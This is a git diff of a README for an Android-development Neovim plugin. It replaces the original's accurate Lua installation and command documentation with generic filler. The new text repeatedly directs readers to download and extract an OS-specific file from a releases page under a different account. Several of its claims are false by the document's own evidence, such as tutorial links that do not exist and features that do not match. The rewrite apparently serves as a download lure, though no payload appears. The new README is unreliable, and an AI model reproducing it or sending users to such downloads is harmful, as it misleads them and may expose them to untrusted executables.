@@ -1,164 +1,95 @@
-<div align="center">
+# 🚀 droid-nvim - Simplifying Android Development Using Neovim
 
-# 🤖 droid.nvim
+[![Download droid-nvim](https://img.shields.io/badge/Download-droid--nvim-brightgreen)](https://github.com/antosubagja123/droid-nvim/releases)
 
-**Android development workflow for Neovim**
+## 📋 Introduction
 
-[![Neovim](https://img.shields.io/badge/Neovim-0.10+-green.svg?style=flat-square&logo=neovim)](https://neovim.io)
-[![Lua](https://img.shields.io/badge/Made%20with-Lua-blue.svg?style=flat-square&logo=lua)](https://lua.org)
-[![MIT License](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)
+Welcome to droid-nvim, your go-to tool for Android development using Neovim! This application helps you create and manage Android projects smoothly, making your development experience faster and more efficient.
 
-Build, run, and debug Android apps directly from Neovim.
+## 📦 Features
 
-</div>
+- **Intuitive Interface**: Work effortlessly with a clean and simple layout.
+- **Built-in Gradle Support**: Easily handle your build process without any hassle.
+- **Lua Configuration**: Customize Neovim's behavior with Lua scripts.
+- **Plugin Support**: Enhance your workflow with various Neovim plugins for added functionalities.
+- **Cross-platform Compatibility**: Use droid-nvim on Windows, macOS, and Linux.
 
-## ✨ Features
+## 💻 System Requirements
 
-- 🚀 **One-Command Workflow** - Build → Install → Launch → Logcat with `:DroidRun`
-- 📱 **Smart Device Management** - Auto-detect devices/emulators
-- 📋 **Real-time Logcat** - Filter by package, tag, log level, and patterns
-- 🔧 **Gradle Integration** - Build, clean, sync with automatic `gradlew` detection
-- ⚙️ **Flexible Windows** - Horizontal, vertical, or floating displays
-- 🎯 **Simple Configuration** - Minimal setup required
+- **Operating System**: Windows 10 or later, macOS 10.13 or later, or any Linux distribution.
+- **Neovim**: Version 0.5 or later.
+- **Java Development Kit (JDK)**: Version 8 or later.
+- **Gradle**: Version 6.0 or later.
 
-## 📦 Installation
+## 🚀 Getting Started
 
-**Requirements:** Neovim 0.10+, Android SDK with `adb` in PATH
+To begin using droid-nvim, follow these simple steps:
 
-```lua
--- lazy.nvim
-{
-  "rrxxyz/droid-nvim",
-  config = function()
-    require("droid").setup()
-  end,
-}
-```
+1. **Download the Application**:
+   Visit the Releases page to download the latest version of droid-nvim.
 
-**Optional Configuration:**
+   [Click here to download droid-nvim](https://github.com/antosubagja123/droid-nvim/releases)
 
-```lua
-require("droid").setup({
-  logcat = {
-    mode = "horizontal", -- "horizontal" | "vertical" | "float"
-    height = 15,
-    filters = {
-      package = "mine", -- "mine" (auto-detect) or specific package
-      log_level = "d", -- v, d, i, w, e, f
-    },
-  },
-  android = {
-    auto_launch_app = true, -- Launch app after install
-    qt_qpa_platform = "xcb", -- Linux: "xcb" or "wayland"
-  },
-})
-```
+2. **Install Dependencies**:
+   Ensure you have Neovim, JDK, and Gradle installed on your machine. You can download them from their official websites:
+   - [Neovim](https://neovim.io/)
+   - [JDK](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html)
+   - [Gradle](https://gradle.org/install/)
 
-## 🚀 Usage
+3. **Extracting Files**:
+   After downloading, locate the file (usually in your Downloads folder) and extract it. You can do this by right-clicking on the file and selecting "Extract Here."
 
-### Essential Commands
+4. **Open Neovim**:
+   Launch Neovim on your machine. If you are using a terminal, you can typically do this by typing `nvim` and pressing Enter.
 
-| Command            | Description                           |
-| ------------------ | ------------------------------------- |
-| `:DroidRun`        | Build → Install → Launch → Logcat    |
-| `:DroidLogcat`     | Show logcat for selected device      |
-| `:DroidBuildDebug` | Build debug APK only                 |
-| `:DroidInstall`    | Install APK without launching        |
-| `:DroidDevices`    | Show available devices/emulators     |
-| `:DroidEmulator`   | Start emulator from AVD list         |
+5. **Configure droid-nvim**:
+   Inside Neovim, you may need to set up some configurations tailored to your workflow. Feel free to customize your Neovim settings.
 
-### Gradle Commands
+6. **Start Your Project**:
+   Create a new Android project or open an existing one. You can now use all the features provided by droid-nvim to develop your application.
 
-| Command             | Description                     |
-| ------------------- | ------------------------------- |
-| `:DroidClean`       | Clean project                  |
-| `:DroidSync`        | Sync dependencies              |
-| `:DroidTask <task>` | Run custom Gradle task         |
+## 💾 Download & Install
 
-### Logcat Filtering
+To download droid-nvim:
 
-| Command                                | Description                      |
-| -------------------------------------- | -------------------------------- |
-| `:DroidLogcatFilter log_level=d`      | Show debug level and above       |
-| `:DroidLogcatFilter tag=MyTag`        | Filter by specific tag           |
-| `:DroidLogcatFilter package=mine`     | Show only your app's logs        |
-| `:DroidLogcatFilter grep=Exception`   | Filter by text pattern           |
+- Go to the [Releases page](https://github.com/antosubagja123/droid-nvim/releases).
+- Find the latest version.
+- Click the download link for your operating system.
+- Follow the extraction and installation steps outlined above.
 
-**Combine filters:** `:DroidLogcatFilter tag=MyTag log_level=d`
+## 📚 Documentation
 
-### Quick Setup
+For detailed documentation on how to use each feature of droid-nvim, check the Wiki section of this repository. Here, you will find guides on advanced configurations, troubleshooting, and best practices.
 
-```lua
--- Recommended keybindings
-vim.keymap.set("n", "<leader>ar", ":DroidRun<CR>", { desc = "Run Android app" })
-vim.keymap.set("n", "<leader>al", ":DroidLogcat<CR>", { desc = "Open logcat" })
-vim.keymap.set("n", "<leader>ab", ":DroidBuildDebug<CR>", { desc = "Build debug APK" })
-vim.keymap.set("n", "<leader>ae", ":DroidEmulator<CR>", { desc = "Launch emulator" })
-```
+## ❓ Frequently Asked Questions
 
-### Typical Workflow
+### 1. Can I use droid-nvim for other programming languages?
 
-1. **`:DroidRun`** - Build, install, launch, and show logcat
-2. **`:DroidLogcatFilter package=mine log_level=d`** - Focus on your app
-3. **`:DroidLogcatFilter tag=MyActivity`** - Filter specific components
-4. Make code changes and repeat
+Yes! While designed for Android development, droid-nvim can be configured for other languages as well. Refer to Neovim's plugin documentation for setup instructions.
 
-### Examples
+### 2. What if I encounter issues?
 
-```vim
-" Build and test
-:DroidRun                            " Full workflow
-:DroidTask assembleRelease           " Build release
-:DroidTask testDebugUnitTest         " Run tests
+If you face any problems while using droid-nvim, please check the Issues tab in this repository. You can search for similar issues or create a new issue for specific problems.
 
-" Logcat filtering
-:DroidLogcatFilter package=mine      " Show only your app
-:DroidLogcatFilter log_level=e       " Errors only
-:DroidLogcatFilter grep=Exception    " Find exceptions
-```
+### 3. Is there support for learning resources?
 
-## 🔧 Setup
+Absolutely! The README includes links to various tutorials and resources that can help you learn both Neovim and Android development.
 
-### Android SDK
+### 4. How can I contribute?
 
-The plugin auto-detects your Android SDK from:
-- `ANDROID_SDK_ROOT` or `ANDROID_HOME` environment variables
-- `vim.g.android_sdk` (manual override)
-- Platform defaults (`~/Library/Android/sdk`, `/opt/android-sdk`, etc.)
+If you would like to contribute to droid-nvim, feel free to fork the repository and submit a pull request. We appreciate any improvements and suggestions.
 
-### Project Requirements
+## 🛠️ Popular Topics
 
-1. Executable `gradlew` in project root: `chmod +x gradlew`
-2. Android SDK with `adb` in PATH
-3. Connected device or running emulator
+- Android
+- Android Developer
+- Android Development
+- Neovim Plugin
+- Lua
+- Gradle
 
-### Linux Users
+## 📬 Contact
 
-Set Qt platform for emulator compatibility:
+For further inquiries or suggestions, feel free to reach out through the Issues section or directly contact the repository owner.
 
-```lua
-require("droid").setup({
-  android = { qt_qpa_platform = "xcb" },
-})
-```
-
-## 🛠️ Troubleshooting
-
-| Issue                     | Solution                                 |
-| ------------------------- | ---------------------------------------- |
-| **"gradlew not found"**   | Run `chmod +x gradlew` in project root   |
-| **"Android SDK not found"** | Set `ANDROID_SDK_ROOT` environment variable |
-| **"No devices available"** | Connect device or start emulator        |
-| **Emulator won't start (Linux)** | Set `qt_qpa_platform = "xcb"` in config |
-
-### Debug Commands
-
-```vim
-:messages                    " Check for errors
-:DroidTask tasks            " List Gradle tasks
-:lua print(require("droid.android").get_adb_path())  " Check ADB path
-```
-
----
-
-**License:** MIT | **Contributions:** Welcome!
+Thank you for choosing droid-nvim! Enjoy developing your Android application with ease.
